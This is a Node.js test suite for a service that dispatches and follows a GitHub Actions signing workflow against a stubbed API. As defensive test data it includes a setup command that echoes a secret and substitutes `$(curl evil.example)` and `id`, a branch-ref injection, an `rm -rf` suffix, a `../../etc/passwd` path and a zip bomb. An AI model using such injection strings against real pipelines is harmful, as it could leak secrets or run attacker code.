// The site's build through the signing workflow (node P15), against a stub of GitHub's API: the dispatch, the
// run followed, each ending mapped, deadlines, lost runs and what a restart does. No test reaches GitHub.
import { test, describe, afterEach } from 'node:test';
import assert from 'node:assert/strict';

import { decodeSiteAuth, decodeSiteRequest } from '@verdikta/stake-attestation-shared/site-request';

import { createWorkflowBuilder } from '../src/builder/workflow.js';
import { draftSpec } from './helpers/fixtures.js';
import { SUCCESS, failed, startGithubStub } from './helpers/githubStub.js';
import { quietLogger } from './helpers/http.js';
import { LISTING_ARTIFACT, SIGNED_ARTIFACT, TOKEN, buildInput, signedListing, workflowConfig, workflowEnv, zipOf } from './helpers/workflowRun.js';
import { zipDeflated } from './helpers/zipDeflate.js';

const open = [];
afterEach(async () => {
  for (const x of open.splice(0)) await x();
});

async function setup({ stub: stubOptions = {}, env: over = {} } = {}) {
  const stub = await startGithubStub(stubOptions);
  open.push(() => stub.close());
  const env = workflowEnv(stub, over);
  const logger = quietLogger();
  const builder = createWorkflowBuilder(workflowConfig(stub, env).builds.workflow, { env, logger });
  open.push(() => builder.stop());
  return { stub, env, logger, builder };
}

/** What a successful run leaves: the signed folder, and the listing folder. */
async function success(extra = {}) {
  const input = buildInput();
  const { folder, report } = await signedListing({ draft: input.draft });
  return { input, folder, report, plan: { statuses: ['queued', 'in_progress', SUCCESS], artifacts: { [SIGNED_ARTIFACT]: zipOf(folder), [LISTING_ARTIFACT]: zipOf({ 'validation-report.json': JSON.stringify(report) }) }, ...extra } };
}

const reportOnly = (report) => ({ [LISTING_ARTIFACT]: zipOf({ 'validation-report.json': JSON.stringify(report) }) });

describe('the dispatch', () => {
  test('the file, branch and repository are the server\'s; the maker\'s request travels only as an encoded blob', async () => {
    const hostile = draftSpec({ commands: { framework: 'forge', setup: 'echo "${{ secrets.VERDIKTA_KMS_ROLE_ARN }}" $(curl evil.example) `id`; ref: refs/heads/evil', build: 'forge build', test: 'forge test', testFiles: 'forge test --match-path $FILES', testIds: 'forge test --match-test $TEST_IDS' } });
    const input = buildInput({ draft: hostile });
    const { stub, builder } = await setup({ stub: { script: () => ({ statuses: [failed()] }) } });
    await builder.build(input);
    const [{ body, authorization, accept }] = stub.state.dispatches;
    assert.equal(body.ref, 'main');
    assert.deepEqual(Object.keys(body).sort(), ['inputs', 'ref']);
    assert.deepEqual(Object.keys(body.inputs).sort(), ['auth', 'chain-id', 'correlation-id', 'maker', 'request']);
    assert.equal(body.inputs['correlation-id'], `testnet-${input.jobId}`);
    assert.equal(body.inputs.maker, input.maker);
    assert.equal(body.inputs['chain-id'], '');
    for (const k of ['request', 'auth']) assert.match(body.inputs[k], /^[A-Za-z0-9+/]+={0,2}$/, k);
    assert.equal(decodeSiteRequest(body.inputs.request), input.signedBody, 'the bytes the wallet signed for, exactly');
    assert.equal(decodeSiteAuth(body.inputs.auth).nonce, input.auth.nonce);
    assert.doesNotMatch(JSON.stringify(body.inputs), /secrets|curl|refs\/heads\/evil/);
    assert.equal(authorization, `Bearer ${TOKEN}`);
    assert.match(accept, /vnd\.github/);
    assert.ok(stub.state.reads.filter((r) => r.path.endsWith('/dispatches')).every((r) => r.path === `/repos/${stub.repo}/actions/workflows/${stub.file}/dispatches`));
  });

  test('a contract listing names its chain, so the caller can pick the explorer from its own variable; the URL is never an input', async () => {
    const draft = { ...draftSpec(), artifact: { kind: 'contract', chainId: 84532, address: '0x5B38Da6a701c568545dCfcB03FcB875f56beddC4' } };
    const input = buildInput({ draft });
    input.deploymentProof = { signer: draft.artifact.address, signature: `0x${'1'.repeat(130)}`, creationTx: null, stakeChainId: 84532, stakeContract: draft.artifact.address };
    const { stub, builder } = await setup({ stub: { script: () => ({ statuses: [failed()] }) } });
    await builder.build(input);
    const { inputs } = stub.state.dispatches[0].body;
    assert.equal(inputs['chain-id'], '84532');
    assert.equal(Object.keys(inputs).some((k) => /explorer|url/i.test(k)), false);
    const auth = decodeSiteAuth(inputs.auth);
    assert.equal(auth.stakeChainId, 84532);
    assert.equal(auth.stakeContract, draft.artifact.address);
  });

  test('answering 204 the run is found by its correlation id, and another run\'s title, branch or event is never taken for it', async () => {
    const { input, plan } = await success();
    const { stub, builder } = await setup({ stub: { script: () => plan } });
    stub.addRun({ display_title: 'testnet-other', status: 'in_progress' });
    stub.addRun({ display_title: `testnet-${input.jobId}`, head_branch: 'evil', status: 'in_progress' });
    stub.addRun({ display_title: `testnet-${input.jobId}`, event: 'pull_request', status: 'in_progress' });
    stub.addRun({ display_title: `testnet-${input.jobId}`, repository: { full_name: 'stranger/fork' }, status: 'in_progress' });
    const seen = [];
    const r = await builder.build(input, { onRun: (x) => seen.push(x) });
    assert.equal(r.status, 'accepted', JSON.stringify(r.error));
    assert.equal(seen.length, 1);
    assert.equal(stub.run(seen[0].id).display_title, `testnet-${input.jobId}`);
    assert.equal(stub.run(seen[0].id).head_branch, 'main');
    assert.equal(stub.run(seen[0].id).event, 'workflow_dispatch');
    assert.match(seen[0].url, /^https:\/\/github\.com\/verdikta\/site-builds\/actions\/runs\/[0-9]+$/);
  });

  test('answering 200 with the run\'s id, it is followed without a search', async () => {
    const { input, plan } = await success();
    const { stub, builder } = await setup({ stub: { answer: 200, script: () => plan } });
    assert.equal((await builder.build(input)).status, 'accepted');
    assert.equal(stub.state.reads.some((r) => r.path.endsWith('/runs') && r.method === 'GET'), false);
  });

  test('a refusal by GitHub started nothing: an error, marked so the attempt can be given back', async () => {
    for (const status of [401, 403, 404, 422]) {
      const { stub, builder, logger } = await setup();
      stub.failWith(/dispatches$/, status);
      const r = await builder.build(buildInput());
      assert.equal(r.status, 'error');
      assert.equal(r.error.code, 'BUILD_DISPATCH_FAILED');
      assert.equal(r.notStarted, true);
      assert.doesNotMatch(logger.lines.join('\n'), new RegExp(TOKEN));
    }
  });

  test('an answer lost on the way may have started a run: it is looked for, and followed if it is there', async () => {
    const { input, plan } = await success();
    const { stub, builder } = await setup({ stub: { script: () => plan } });
    stub.failWith(/dispatches$/, 502);
    stub.addRun({ display_title: `testnet-${input.jobId}`, status: 'in_progress' }, plan);
    assert.equal((await builder.build(input)).status, 'accepted');
    const lost = await setup();
    lost.stub.failWith(/dispatches$/, 502);
    const r = await lost.builder.build(buildInput());
    assert.equal(r.error.code, 'BUILD_DISPATCH_FAILED');
    assert.equal(r.notStarted, undefined, 'a run may exist: the attempt stays charged and the sweep looks for it');
  });

  test('without the token nothing is sent, and the refusal names the variable, not a value', async () => {
    const { stub, env, logger } = await setup();
    const builder = createWorkflowBuilder(workflowConfig(stub, env).builds.workflow, { env: {}, logger });
    const r = await builder.build(buildInput());
    assert.equal(r.status, 'error');
    assert.equal(stub.state.dispatches.length, 0);
    assert.match(r.error.detail, /SA_BUILD_WORKFLOW_TOKEN/);
  });

  test('a request over what a dispatch can carry is refused before anyone signs: named, with the numbers', async () => {
    const { builder } = await setup();
    assert.equal(builder.requestProblem({ signedBody: JSON.stringify({ spec: {}, maker: 'x' }) }), null);
    const big = Array.from({ length: 40000 }, () => Math.random().toString(36)).join('');
    const p = builder.requestProblem({ signedBody: big });
    assert.equal(p.code, 'DISPATCH_REQUEST_TOO_LARGE');
    assert.match(p.detail, /[0-9]+/);
  });
});

describe('required reviewers', () => {
  test('on: a run waiting for approval is a state, the slot-holder hears of it, and it goes on when approved', async () => {
    const { input, plan } = await success({ statuses: ['queued', 'in_progress', 'waiting', 'waiting', 'in_progress', SUCCESS] });
    const { builder } = await setup({ stub: { script: () => plan } });
    const states = [];
    const r = await builder.build(input, { onState: (s) => states.push(s) });
    assert.deepEqual(states, ['awaiting_approval', 'signing']);
    assert.equal(r.status, 'accepted');
  });

  test('off: the same dispatch and the same calls, with no state of its own and nothing to configure', async () => {
    const { input, plan } = await success();
    const { stub, builder } = await setup({ stub: { script: () => plan } });
    const states = [];
    assert.equal((await builder.build(input, { onState: (s) => states.push(s) })).status, 'accepted');
    assert.deepEqual(states, []);
    assert.equal(stub.state.reads.some((x) => x.path.endsWith('/approvals')), false);
  });

  test('a reviewer who declines is a refusal by a code, and the report says so', async () => {
    const { input, report } = await success();
    const { builder } = await setup({ stub: { script: () => ({ statuses: ['waiting', failed()], approvals: [{ state: 'rejected', comment: 'text a person typed' }], artifacts: reportOnly(report) }) } });
    const r = await builder.build(input);
    assert.equal(r.status, 'refused');
    assert.equal(r.report.status, 'refused');
    assert.equal(r.report.refusals.at(-1).code, 'SIGNING_DECLINED');
    assert.doesNotMatch(JSON.stringify(r), /text a person typed/);
  });

  test('nobody answers: at its deadline the run is cancelled and the job says what happened; time waiting does not count against the running deadline', async () => {
    const { stub, builder } = await setup({ stub: { script: () => ({ statuses: ['in_progress', 'waiting'] }) }, env: { SA_BUILD_RUN_DEADLINE_MS: '40', SA_BUILD_APPROVAL_DEADLINE_MS: '120' } });
    const started = Date.now();
    const r = await builder.build(buildInput());
    assert.equal(r.status, 'error');
    assert.equal(r.error.code, 'APPROVAL_DEADLINE');
    assert.ok(Date.now() - started >= 100, 'past the running deadline');
    assert.equal(stub.state.cancels.length, 1);
    assert.match(r.error.detail, /submit again/);
  });
});

describe('a hung or lost run', () => {
  test('a run past its deadline is cancelled, and the build returns whether or not the cancel worked', async () => {
    for (const cancelStatus of [202, 500]) {
      const { stub, builder } = await setup({ stub: { script: () => ({ statuses: ['in_progress'] }) }, env: { SA_BUILD_RUN_DEADLINE_MS: '30' } });
      stub.state.cancelStatus = cancelStatus;
      const r = await builder.build(buildInput());
      assert.equal(r.error.code, 'RUN_DEADLINE');
      assert.equal(stub.state.cancels.length, 1);
    }
  });

  test('GitHub going silent does not stop the clock: the deadline still ends the build', async () => {
    const { stub, builder } = await setup({ stub: { script: () => ({ statuses: ['in_progress'] }) }, env: { SA_BUILD_RUN_DEADLINE_MS: '30' } });
    stub.failWith(/\/runs\/[0-9]+$/, 503, 'GET');
    const r = await builder.build(buildInput());
    assert.equal(r.error.code, 'RUN_DEADLINE');
  });

  test('a passing failure of the API costs nothing', async () => {
    const { input, plan } = await success({ statuses: ['in_progress', 'in_progress', SUCCESS] });
    const { stub, builder, logger } = await setup({ stub: { script: () => plan } });
    stub.failWith(/\/runs\/[0-9]+$/, 500, 'GET');
    setTimeout(() => stub.heal(), 20);
    assert.equal((await builder.build(input)).status, 'accepted');
    assert.doesNotMatch(logger.lines.join('\n'), new RegExp(TOKEN));
  });

  test('a dispatch whose run never appears is an error at once the search ends, and the late run is cancelled by the next sweep', async () => {
    const input = buildInput();
    const { stub, builder } = await setup({ stub: { script: () => ({ silent: true }) }, env: { SA_BUILD_FIND_MS: '20' } });
    const r = await builder.build(input);
    assert.equal(r.error.code, 'RUN_NOT_FOUND');
    const late = stub.addRun({ display_title: `testnet-${input.jobId}`, status: 'in_progress' });
    await builder.sweep();
    assert.deepEqual(stub.state.cancels, [late.id]);
  });

  test('a run deleted while it is followed is lost, at once', async () => {
    const { stub, builder } = await setup({ stub: { script: () => ({ statuses: ['in_progress'] }) } });
    const p = builder.build(buildInput());
    setTimeout(() => stub.state.runs.clear(), 15);
    assert.equal((await p).error.code, 'RUN_LOST');
  });
});

describe('a restart', () => {
  test('the first sweep abandons this site\'s runs that nothing follows, in every active state, and only those', async () => {
    const { stub, builder } = await setup();
    const mine = ['queued', 'in_progress', 'waiting', 'pending', 'requested'].map((status, i) => stub.addRun({ display_title: `testnet-${String(i).repeat(32)}`, status }));
    const done = stub.addRun({ display_title: `testnet-${'9'.repeat(32)}`, status: 'completed', conclusion: 'success' });
    const others = [
      stub.addRun({ display_title: `mainnet-${'1'.repeat(32)}`, status: 'in_progress' }),
      stub.addRun({ display_title: 'manual-first-signing', status: 'waiting' }),
      stub.addRun({ display_title: `testnet-${'2'.repeat(31)}`, status: 'in_progress' }),
      stub.addRun({ display_title: `testnet-${'3'.repeat(32)}`, status: 'in_progress', head_branch: 'other' }),
    ];
    await builder.start();
    assert.deepEqual([...stub.state.cancels].sort(), mine.map((r) => r.id).sort());
    assert.equal(stub.state.cancels.includes(done.id), false);
    for (const r of others) assert.equal(stub.state.cancels.includes(r.id), false, r.display_title);
  });

  test('the sweep leaves alone a run it is following or still looking for, and cancels a second run under the same id', async () => {
    const input = buildInput();
    const { stub, builder } = await setup({ stub: { script: () => ({ statuses: ['in_progress'] }) }, env: { SA_BUILD_RUN_DEADLINE_MS: '150' } });
    const p = builder.build(input);
    await new Promise((r) => setTimeout(r, 40));
    await builder.sweep();
    assert.deepEqual(stub.state.cancels, []);
    const second = stub.addRun({ display_title: `testnet-${input.jobId}`, status: 'in_progress' });
    await builder.sweep();
    assert.deepEqual(stub.state.cancels, [second.id]);
    await p;
  });

  test('a cancel that does not take is tried again, and forced', async () => {
    const { stub, builder } = await setup();
    stub.state.cancelStatus = 500;
    const run = stub.addRun({ display_title: `testnet-${'1'.repeat(32)}`, status: 'in_progress' });
    await builder.sweep();
    await builder.sweep();
    await builder.sweep();
    assert.equal(stub.state.cancels.filter((x) => x === run.id).length, 2);
    assert.deepEqual(stub.state.forceCancels, [run.id]);
  });

  test('a sweep that cannot read GitHub logs a code and leaves the server up', async () => {
    const { stub, builder, logger } = await setup();
    stub.failWith(/\/runs$/, 500);
    await builder.start();
    assert.match(logger.lines.join('\n'), /sweep/);
    assert.doesNotMatch(logger.lines.join('\n'), new RegExp(TOKEN));
    builder.stop();
  });
});

describe('how a run ends', () => {
  test('success: the signed folder\'s files, and no dev trust whatever the folder holds', async () => {
    const { input, plan, folder } = await success();
    const { stub, builder } = await setup({ stub: { script: () => plan } });
    const r = await builder.build(input);
    assert.equal(r.status, 'accepted');
    assert.deepEqual(Buffer.from(r.files.codeReview), Buffer.from(folder['code_review.json']));
    assert.deepEqual(Buffer.from(r.files.attestation), Buffer.from(folder['attestation.json']));
    assert.ok(r.files.baseline && r.files.knownIssues);
    assert.equal(r.devTrust, null);
    assert.equal(r.report.status, 'accepted');
    assert.deepEqual(stub.state.blobRequests, [{ authorization: null }], 'the token is never sent to where the artifact is stored');
  });

  test('a redirect to anywhere but https (plain http only on loopback) is not followed, and the token stays home', async () => {
    const { input, plan } = await success();
    const { stub, builder } = await setup({ stub: { script: () => plan } });
    stub.state.redirectTo = 'http://storage.example.invalid/blob';
    const r = await builder.build(input);
    assert.equal(r.status, 'error');
    assert.equal(r.error.code, 'BUILDER_OUTPUT_UNREADABLE');
  });

  test('the builder refused: its report says why', async () => {
    const report = { status: 'refused', refusals: [{ code: 'NO_PROOF_FILE', detail: 'x', step: 'control' }], steps: [] };
    const { builder } = await setup({ stub: { script: () => ({ statuses: [failed()], artifacts: reportOnly(report) }) } });
    const r = await builder.build(buildInput());
    assert.equal(r.status, 'refused');
    assert.deepEqual(r.report, report);
  });

  test('the builder errored: its code and detail', async () => {
    const report = { status: 'error', error: { code: 'LISTING_CHECK_ABSTAINED', detail: 'pull failed', step: 'listingCheck' }, steps: [] };
    const { builder } = await setup({ stub: { script: () => ({ statuses: [failed()], artifacts: reportOnly(report) }) } });
    const r = await builder.build(buildInput());
    assert.equal(r.status, 'error');
    assert.equal(r.error.code, 'LISTING_CHECK_ABSTAINED');
    assert.deepEqual(r.report, report);
  });

  test('the build passed and a later job failed: the job says so and the run has the rest', async () => {
    const { input, report } = await success();
    const { builder } = await setup({ stub: { script: () => ({ statuses: [failed()], artifacts: reportOnly(report) }) } });
    const r = await builder.build(input);
    assert.equal(r.error.code, 'PUBLISH_OR_SIGN_FAILED');
    assert.equal(r.report.status, 'accepted');
  });

  test('no report: the run\'s conclusion, by a code', async () => {
    for (const [conclusion, code] of [['failure', 'RUN_FAILURE'], ['cancelled', 'RUN_CANCELLED'], ['timed_out', 'RUN_TIMED_OUT'], ['startup_failure', 'RUN_STARTUP_FAILURE'], ['weird text; rm -rf', 'RUN_FAILED']]) {
      const { builder } = await setup({ stub: { script: () => ({ statuses: [failed(conclusion)] }) } });
      const r = await builder.build(buildInput());
      assert.equal(r.status, 'error', conclusion);
      assert.equal(r.error.code, code);
      assert.doesNotMatch(r.error.detail, /rm -rf/);
    }
  });

  test('a success that left no usable folder is an error, however it failed', async () => {
    const { input, folder } = await success();
    const bomb = zipDeflated([{ name: 'code_review.json', bytes: Buffer.alloc(32 * 1024 * 1024, 0x20) }]);
    const { ['attestation.json']: _a, ...noAttestation } = folder;
    const cases = [
      [{}, 'BUILDER_OUTPUT_INVALID'],
      [{ [SIGNED_ARTIFACT]: Buffer.from('not a zip') }, 'BUILDER_OUTPUT_UNREADABLE'],
      [{ [SIGNED_ARTIFACT]: bomb }, 'BUILDER_OUTPUT_UNREADABLE'],
      [{ [SIGNED_ARTIFACT]: zipOf(noAttestation) }, 'BUILDER_OUTPUT_INVALID'],
      [{ [SIGNED_ARTIFACT]: zipOf({ ...folder, 'code_review.json': '{' }) }, 'BUILDER_OUTPUT_INVALID'],
      [{ [SIGNED_ARTIFACT]: zipOf({ ...folder, 'validation-report.json': '{' }) }, 'BUILDER_OUTPUT_INVALID'],
    ];
    for (const [artifacts, code] of cases) {
      const { builder } = await setup({ stub: { script: () => ({ statuses: [SUCCESS], artifacts }) } });
      const r = await builder.build(input);
      assert.equal(r.status, 'error', code);
      assert.equal(r.error.code, code);
    }
  });

  test('an artifact above the cap is not read to its end', async () => {
    const { input, plan } = await success();
    const { builder } = await setup({ stub: { script: () => plan }, env: { SA_BUILD_ARTIFACT_MAX_BYTES: '1024' } });
    const r = await builder.build(input);
    assert.equal(r.error.code, 'BUILDER_OUTPUT_UNREADABLE');
  });

  test('a file named by a path, not a plain name, is not read', async () => {
    const { input, folder } = await success();
    const spec = JSON.parse(folder['code_review.json']);
    spec.baseline = '../../etc/passwd';
    const { builder } = await setup({ stub: { script: () => ({ statuses: [SUCCESS], artifacts: { [SIGNED_ARTIFACT]: zipOf({ ...folder, 'code_review.json': JSON.stringify(spec) }) } }) } });
    assert.equal((await builder.build(input)).error.code, 'BUILDER_OUTPUT_INVALID');
  });

  test('an image anywhere but under ghcr.io/verdikta is refused: every listing\'s image goes there (Q42)', async () => {
    const { input, folder } = await success();
    const spec = JSON.parse(folder['code_review.json']);
    spec.env.image = `ghcr.io/stranger/env@sha256:${'a'.repeat(64)}`;
    const { builder } = await setup({ stub: { script: () => ({ statuses: [SUCCESS], artifacts: { [SIGNED_ARTIFACT]: zipOf({ ...folder, 'code_review.json': JSON.stringify(spec) }) } }) } });
    assert.equal((await builder.build(input)).error.code, 'IMAGE_NOT_UNDER_VERDIKTA');
  });
});
